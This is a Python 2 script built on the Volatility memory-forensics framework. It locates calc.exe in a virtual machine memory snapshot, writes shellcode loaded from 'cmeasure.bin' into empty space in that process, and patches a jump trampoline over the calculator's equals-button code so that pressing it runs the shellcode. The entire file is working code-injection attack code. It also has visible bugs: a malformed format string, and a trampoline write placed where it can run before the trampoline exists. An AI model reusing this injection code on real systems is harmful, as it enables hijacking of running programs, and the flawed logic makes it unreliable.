import sys
import struct
import volatility.conf as conf
import volatility.registry as registry
import volatility.commands as commands
import volatility.addrsspace as addrsspace
import volatility.plugins.taskmods as taskmods


equals_button = 0x01005D51
memory_file = "<MEMORY PROFILE>"
slack_space = None
trampoline_offset = None


#Read in the shellcode 
shellCodeFd = open("cmeasure.bin", "rb")
shellContents = shellCodeFd.read()
shellCodeFd.close()

sys.path.append("<*****PATH TO VOLATILITY******>")

registry.PluginImporter()
config = conf.ConfObject()

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrsspace.BaseAddressSpace)
config.parse_options()
config.PROFILE = "<********PROFILE******>"
config.LOCATION = "file://%s" %memory_file
	
processes = taskmods.PSList(config)
for process in processes.calculate():
	if str(process.ImageFileName) == "calc.exe":
		print "[*] Found calc.exe with PID: %d" %process.UniqueProcessId
		print "[*] Hunting for physical offsets...Please wait"
		address_space = process.get_process_address_space()
		pages = address_space.get_available_pages()

		for page in pages:
			physical = address_space.vtop(page[0])
			if physical is not None:
				if slack_space is None:
					fd = open(memory_file, "r+")
					fd.seek(physical)
					buff = fd.read(page[1])
					try:
						offset = buff.index("\x00" * len(shellContents))
						slack_space = page[0]+offset
						print"[*0]Found good shellcode location"
						print "[*] Virtual address: 0x%08x" %slack_space
						print "[*] Physical address: 0x08x" %(physical+offset)

						print "Injecting shellcode...."
						fd.seek(physical+offset)
						fd.write(shellContents)
						fd.flush()

						#create the trampoline
						tramp = "\xbb%s" %struct.pack("<L", page[0]+offset)
						tramp += "\xff\xe3"
						if trampoline_offset is not None:
							break
					except:
						pass
					fd.close()
					#Check for target code location
					if page[0] <= equals_button and equals_button < ((page[0]+page[1])-7):
						print "[*] Found our trampoline target at: 0x%08x" %physical
						#Calculate the virtual offset
						virtOffset = equals_button - page[0]
						#Calculate the physical offset
						trampoline_offset = physical + virtOffset
						print "[*] Found our trampoline target at: 0x%08x" %trampoline_offset

						if slack_space is not None:
							break
					print "[*] Writing the trampoline..."
					fd = open(memory_file, "r+")
					fd.seek(trampoline_offset)
					fd.write(tramp)
					fd.close()
					print "[*] Done writing the trampoline"


